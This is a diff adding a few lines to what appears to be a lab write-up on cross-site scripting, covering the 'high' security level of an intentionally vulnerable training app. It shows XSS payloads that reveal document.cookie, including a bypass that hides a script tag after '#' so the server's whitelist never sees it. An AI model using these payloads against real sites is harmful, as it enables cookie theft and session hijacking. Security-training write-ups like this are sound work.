@@ -833,6 +833,10 @@ payload=`" ></option></select><img src=x onerror="alert(document.cookie)">`
 
 **Security level is currently: high.**
 
+This time server is using whitelist we can bypass that by puting our payload after `#` because anything after `#` is not sent to server but still reflecting on the page.
+
+payload=`#<script>alert(document.cookie);</script>`
+
 
 <br/>
 
